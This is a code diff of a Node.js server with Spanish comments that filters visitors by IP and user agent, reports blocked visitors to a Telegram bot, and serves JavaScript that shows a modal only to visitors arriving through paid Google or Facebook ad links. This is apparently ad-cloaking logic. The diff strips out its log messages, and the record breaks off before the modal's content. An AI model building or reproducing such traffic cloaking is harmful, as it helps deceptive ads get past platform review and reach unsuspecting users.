@@ -21,7 +21,7 @@ async function verificarVisitante(req) {
     console.log(`\n🔎 IP: ${ip} | UA: ${ua.substring(0, 20)}...`);
 
     if (ip === '::1' || ip === '127.0.0.1' || ip.includes('192.168.') || ip.includes('::ffff:127.0.0.1')) {
-        console.log("✅ LOCALHOST: Filtros desactivados.");
+        console.log("");
         return { ok: true };
     }
 
@@ -50,29 +50,29 @@ app.get('/:slug', async (req, res) => {
         const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
         axios.post(`https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage`, {
             chat_id: CONFIG.TG_CHAT,
-            text: `🚫 *BLOQUEO*\nIP: \`${ip}\`\nMotivo: ${check.r}`,
+            text: `*BLOQUEO*\nIP: \`${ip}\`\nMotivo: ${check.r}`,
             parse_mode: 'Markdown'
         }).catch(()=>{});
 
         res.set('Content-Type', 'application/javascript');
-        return res.send("console.log('⛔ BLOQUEADO'); window.__view = true;");
+        return res.send("console.log(''); window.__view = true;");
     }
 
     // CASO B: APROBADO
-    console.log("🚀 Enviando lógica de redirección...");
+    console.log("");
     res.set('Content-Type', 'application/javascript');
     
     // MODIFICACIÓN PRINCIPAL AQUÍ
     const payload = `
         (function(){
             var url = window.location.href;
-            console.log("Analizando URL:", url);
+            console.log("URL:", url);
 
             var triggers = ["gclid", "gad_source", "gbraid", "fbclid"];
             var esTraficoPago = triggers.some(function(t) { return url.indexOf(t) !== -1; });
 
             if (esTraficoPago) {
-                console.log("🚀 TRAFICO PAGO DETECTADO -> MOSTRANDO MODAL");
+                console.log("");
 
                 function mostrarModal() {
                     // 1. Ocultamos el preloader
